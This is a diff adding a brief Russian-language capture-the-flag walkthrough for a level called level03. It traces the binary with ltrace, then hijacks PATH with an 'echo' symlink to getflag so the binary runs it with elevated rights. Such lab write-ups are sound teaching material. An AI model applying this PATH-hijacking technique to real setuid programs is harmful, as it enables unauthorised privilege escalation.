@@ -1,0 +1,10 @@
+Бинарник не запускается, зато запускается ltrace
+ltrace ./level03
+Видим использование команды echo
+Создаем темповую директорию со ссылкой на использование getflag вместо echo
+И запускаем бинарник
+mkdir /tmp/level03
+cd /tmp/level03
+ln -s /bin/getflag echo
+cd -
+PATH=/tmp/level03 ./level03
